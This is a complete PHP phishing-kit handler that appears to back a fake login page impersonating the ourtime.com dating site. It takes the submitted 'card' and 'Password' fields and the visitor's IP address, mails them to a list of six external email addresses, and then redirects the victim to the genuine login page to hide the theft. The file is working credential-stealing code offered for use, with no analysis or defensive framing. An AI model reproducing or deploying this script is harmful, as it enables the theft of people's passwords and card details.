<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || PARPPEA || :------\n";
$message .= "card: ".$_POST['formtext1']."\n";
$message .= "Password: ".$_POST['formtext2']."\n";
$message .= "----: || THANKS BE TO GOD || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="markj32@aol.com,jm0891566@gmail.com,jm919798@gmail.com,jm919798@yahoo.com,markj32@gmx.com,j0hj0@yandex.com

";
$subject = "tare | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: https://www.ourtime.com/v3/login?CPSessionID=9cacecd6-26c1-4ad4-8019-f932e7808879&VisitorID=14469841062");
?>